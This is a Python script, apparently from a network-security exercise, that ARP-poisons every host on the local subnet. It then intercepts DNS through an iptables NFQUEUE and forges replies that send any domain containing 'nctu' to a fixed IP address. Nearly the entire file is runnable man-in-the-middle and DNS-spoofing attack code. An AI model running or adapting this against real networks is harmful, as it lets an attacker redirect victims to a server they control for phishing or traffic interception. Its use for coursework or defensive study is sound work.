#!/usr/bin/env python
from scapy.all import *
import argparse
from netfilterqueue import NetfilterQueue
import socket
from uuid import getnode as get_mac
import os

##https://medium.com/@eric19921204/%E7%94%A8python%E5%AF%A6%E4%BD%9C%E4%B8%80%E5%80%8B%E7%B6%B2%E8%B7%AF%E6%8E%83%E7%9E%84%E5%99%A8-82666b76b557
def scan(ip):
    arp_request = ARP(pdst=ip)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = srp(arp_request_broadcast, timeout=3, verbose=False)[0]

    client_list = []
    for element in answered_list:
        client_dict = {"ip": element[1].psrc, "mac": element[1].hwsrc}
        client_list.append(client_dict)
    return client_list


##https://zhuanlan.zhihu.com/p/34897282
def initial(host,topper,clients):
    for i in range(len(clients)):
        ##spoof wifi
        spoof_wifi = Ether(src=host['mac'], dst=topper['mac'])/ARP(hwsrc=host['mac'], psrc=clients[i]['ip'], hwdst=topper['mac'], pdst=topper['ip'], op=2)
        ##spoof victum
        spoof_victum = Ether(src=host['mac'],dst=clients[i]['mac'])/ARP(psrc=clients[i]['ip'],pdst=topper['ip'],hwsrc=clients[i]['mac'],hwdst=host['mac'],op=2)
        for i in range(3):

            result = srp(spoof_wifi, timeout=3, verbose=0)[0]
            sresult = srp(spoof_victum ,timeout=3,verbose=0)[0]


##https://stackoverflow.max-everyday.com/2017/02/python-netifaces/
def get_ip_address():

    import socket
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(('google.com', 0))
    ipaddr=s.getsockname()[0]
    return ipaddr
ip = get_ip_address()


def process_packet(packet):
    """
    Whenever a new packet is redirected to the netfilter queue,
    this callback is called.
    """
    global modified
    modified = False
    # convert netfilter queue packet to scapy packet
    scapy_packet = IP(packet.get_payload())
    if scapy_packet.haslayer(DNSRR):
        # if the packet is a DNS Resource Record (DNS reply)
        # modify the packet
        try:
            modify_packet(scapy_packet)
        except IndexError:
            # not UDP packet, this can be IPerror/UDPerror packets
            pass
        # set back as netfilter queue packet
    # accept the packet
    for i in range(len(clients)):
        if(modified==clients[i]['ip']):
            pkt = DNS_res(clients[i]['mac'],topper['mac'],scapy_packet)
            sendp(pkt,verbose=0)
            sendForgedPacket(scapy_packet)
            packet.drop()
            return
    
    packet.accept()

def sendForgedPacket(pkt):
    print pkt.summary()
    src_port_query = pkt[UDP].sport
    domainQuery = pkt[DNS].qd.qname
    tx_id_query = pkt[DNS].id
    attacker_web_ip = "140.113.207.246"
    for i in range(len(clients)):
        eth = Ether(dst=topper['mac'], src=clients[i]['mac'])
        ip = IP(dst=clients[i]['ip'], src=topper['ip'])
        udp = UDP(sport=53, dport=src_port_query)
        dns = DNS(id=tx_id_query,
                  qr=1,
                  aa=1,
                  rd=0,
                  ra=0,
                  ancount=1,
                  qd=DNSQR(qname=domainQuery, qtype='A'),
                  an=DNSRR(rrname=domainQuery, rdata=attacker_web_ip) /
                  DNSRR(rrname=domainQuery,
                        type='A',
                        rdata=attacker_web_ip,
                        ttl=5))
        pkt_forged = eth / ip / udp / dns
        print pkt_forged.summary()
        sendp(pkt_forged)

def DNS_res(mac1,mac2,pkt):
    
    ip_address = "140.113.207.246"


    return Ether(dst=mac2,src=mac1)/IP(dst=pkt[IP].src,src=pkt[IP].dst) / UDP(dport=pkt[UDP].sport,sport=53) / DNS(id=pkt[DNS].id,qd=pkt[DNS].qd,aa=1,qr=1, ancount=1,an=DNSRR(rrname=pkt[DNSQR].qname,rdata=ip_address) / DNSRR(rrname=pkt[DNSQR].qname,rdata=ip_address))
    ##return IP(dst=ip.src, dst=ip.dst)/UDP(dport=udp.sport,sport=53)/DNS(id = dns.id,ancount=1,an=dns.an)

def modify_packet(packet):
    """
    Modifies the DNS Resource Record `packet` ( the answer part)
    to map our globally defined `dns_hosts` dictionary.
    For instance, whenver we see a google.com answer, this function replaces 
    the real IP address (172.217.19.142) with fake IP address (192.168.1.100)
    """
    # get the DNS question name, the domain name
    qname = packet[DNSQR].qname
    global modified
    modified = ''
    if('nctu' not in qname):
        return
    ip_address = '140.113.207.246'
    modified = packet[IP].src
            # if the website isn't in our record
            # we don't wanna modify that]
    
    # craft new answer, overriding the original
    # setting the rdata for the IP we want to redirect (spoofed)
    # for instance, google.com will be mapped to "192.168.1.100"
    #packet[DNS].an = DNSRR(rrname=qname, rdata=ip_address)
    # set the answer count to 1
    #packet[DNS].ancount = 1
    # delete checksums and length of packet, because we have modified the packet
    # new calculations are required ( scapy will do automatically )

    #del packet[IP].len
    #del packet[IP].chksum
    #del packet[UDP].len
    #del packet[UDP].chksum
    # return the modified packet
    return


##https://stackoverflow.max-everyday.com/2017/02/python-netifaces/
def get_mac_address():
    mac = get_mac()
    macmac = ':'.join(("%012x" % mac)[i:i+2] for i in range(0, 12, 2))


if __name__ == "__main__":
    mac = get_mac_address()
    scan_result = scan(ip+'/24')
    topper ={}
    clients =[]
    host = {'ip':ip,'mac':mac}
    for client in scan_result:
        if(client["ip"].split('.')[3]=='1'):
            topper = {'ip':client['ip'],'mac':client['mac']}
        else:
            tmp={'ip':client['ip'],'mac':client['mac']}
            clients.append(tmp)
    print('--'*8)
    print('AP:')
    print(topper)
    print('--'*8)
    print('clients:')
    print(clients)
    print('--'*8)
    initial(host,topper,clients)
    os.system("sysctl -w net.ipv4.ip_forward=1")
    
    QUEUE_NUM = 0
    # insert the iptables FORWARD rule
    os.system("iptables -I OUTPUT -j NFQUEUE --queue-num {}".format(QUEUE_NUM))
    os.system("iptables -I INPUT -j NFQUEUE --queue-num {}".format(QUEUE_NUM))
    # instantiate the netfilter queue
    queue = NetfilterQueue()
    modified = False
    try:
        # bind the queue number to our callback `process_packet`
        # and start it
        queue.bind(QUEUE_NUM, process_packet)
        queue.run()
    except KeyboardInterrupt:
        # if want to exit, make sure we
        # remove that rule we just inserted, going back to normal.
        os.system("iptables --flush")
